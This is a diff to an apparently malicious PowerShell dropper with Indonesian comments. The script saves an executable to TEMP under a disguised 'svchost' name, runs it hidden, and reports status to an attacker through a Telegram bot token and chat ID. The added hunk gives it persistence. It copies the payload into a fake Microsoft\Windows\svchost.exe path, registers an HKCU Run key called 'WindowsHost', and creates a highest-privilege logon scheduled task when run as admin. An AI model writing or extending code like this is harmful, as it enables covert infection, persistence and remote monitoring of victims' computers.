@@ -10,6 +10,7 @@ $urlB64  = ''                       # opsional: URL .b64 (base64 exe) sbg cadang
 $exe     = Join-Path $env:TEMP ('svchost_{0}.exe' -f (Get-Random -Minimum 10000 -Maximum 99999))
 $bot     = '9037027380:AAFrvv-oDxBH65pNbv0aNAflsjMAijyDMKo'
 $chat    = '949121454'
+$persist = $true
 $cleanup = $false
 $ua      = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'
 # ----------------------------------------------------------------------
@@ -76,6 +77,22 @@ else {
     # ---------- 3. jalan ------------------------------------------------
     Start-Process -FilePath $exe -WindowStyle Hidden
     T 'started'
+
+    # ---------- 3b. persistence --------------------------------------
+    if ($persist) {
+        $dst = Join-Path $env:LOCALAPPDATA 'Microsoft\Windows\svchost.exe'
+        New-Item (Split-Path $dst) -ItemType Directory -Force | Out-Null
+        Copy-Item $exe $dst -Force -ErrorAction SilentlyContinue
+        try {
+            New-ItemProperty 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'WindowsHost' -Value ('"' + $dst + '"') -PropertyType String -Force | Out-Null
+            T 'persist run ok'
+        } catch { T 'persist run gagal' }
+        if (([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole('Administrators')) {
+            schtasks.exe /create /tn 'WindowsHost' /tr ('"' + $dst + '"') /sc onlogon /rl highest /f *> $null
+            T 'persist task dicoba'
+        }
+        T "persist dst=$dst"
+    }
 
     # ---------- 4. bukti -----------------------------------------------
     if ($bot -and $chat) {
